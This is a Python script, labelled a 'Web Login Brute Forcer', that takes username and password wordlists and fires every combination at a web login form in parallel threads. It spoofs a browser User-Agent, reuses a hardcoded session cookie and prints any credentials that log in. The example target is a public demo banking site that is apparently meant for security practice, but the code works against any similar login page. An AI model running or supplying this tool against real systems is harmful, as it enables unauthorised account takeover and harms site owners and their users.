#!/usr/bin/python3

import requests
import sys
import concurrent.futures
from argparse import ArgumentParser

parser = ArgumentParser(description="Web Login Brute Forcer", epilog='''
                        Example Usage: ./bruteforcer.py -u http://demo.testfire.net/doLogin -U username -P password''')

rp = parser.add_argument_group('required arguments')
rp.add_argument('-U', '--userfile', help='give user file', dest='username_file', type=str, required=True)
rp.add_argument('-u', '--url', help='give url', dest='url', type=str, required=True)
rp.add_argument('-P', '--passfile', help='give pass file', dest='password_file', type=str, required=True)

args = parser.parse_args()

headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'}
cookies = {'JSESSIONID': 'F787C86BAA35B5D652E439757ABD161B'}
url = args.url

# Check if required arguments are missing
if not args.username_file or not args.url or not args.password_file:
    parser.error("Missing required arguments. Please provide -U, -u, and -P.")

success_flag = False

def attempt_login(username, password):
    global success_flag
    post_data = {'uid': username.rstrip(), 'passw': password.rstrip(), 'btnSubmit': 'Login'}
    response = requests.post(url, headers=headers, cookies=cookies, data=post_data)
    if len(response.history) > 0:
        for history in response.history:
            if history.headers.get('Location') == 'login.jsp':
                print("Attempt Failed : ", username.rstrip(), password.rstrip())
                break
        else:
            print("Attempt Success : ", username.rstrip(), password.rstrip())
            print("Response Headers:", response.headers)
            success_flag = True
            return  # exit the function

def brute_force_for_user(user):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(attempt_login, [user]*len(password_file), password_file)

username_file = open(args.username_file, "r").readlines()
password_file = open(args.password_file, "r").readlines()

with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(brute_force_for_user, username_file)

# Terminate the program after successful attempt
if success_flag:
    sys.exit(0)
